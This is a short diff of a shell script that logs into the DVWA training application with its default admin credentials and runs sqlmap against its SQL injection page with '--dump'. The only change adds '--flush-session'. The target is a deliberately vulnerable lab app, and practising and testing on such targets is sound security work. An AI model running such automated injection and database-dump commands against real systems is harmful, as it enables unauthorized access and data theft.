@@ -23,4 +23,4 @@ SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
 curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$host/login.php"
 SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
 cookie="PHPSESSID=${SESSIONID}"
-sqlmap --random-agent -u "$host/vulnerabilities/sqli/?id=1&Submit=Submit#&#8221" --cookie="$cookie; security=low" --dump
+sqlmap --random-agent --flush-session -u "$host/vulnerabilities/sqli/?id=1&Submit=Submit#&#8221" --cookie="$cookie; security=low" --dump
